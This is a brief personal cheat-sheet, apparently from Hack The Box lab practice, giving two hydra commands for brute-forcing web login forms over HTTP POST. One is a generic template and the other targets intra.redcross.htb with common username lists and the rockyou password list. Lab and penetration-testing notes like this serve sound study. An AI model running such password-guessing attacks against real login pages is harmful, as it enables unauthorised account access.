# HTTP Post
```

hydra -L UsersFile -P PasswordFile domain.htb http-post-form "/endpoint:postContent with ^USER^ and ^PASS^ set:Message if it fails"
hydra -L $SECLIST/Usernames/top-usernames-shortlist.txt -P /home/lotape6/resources/hack/rockyou.txt intra.redcross.htb http-post-form "?page=login:user=^USER^&pass=^PASS^&action=login:Wrong data"

```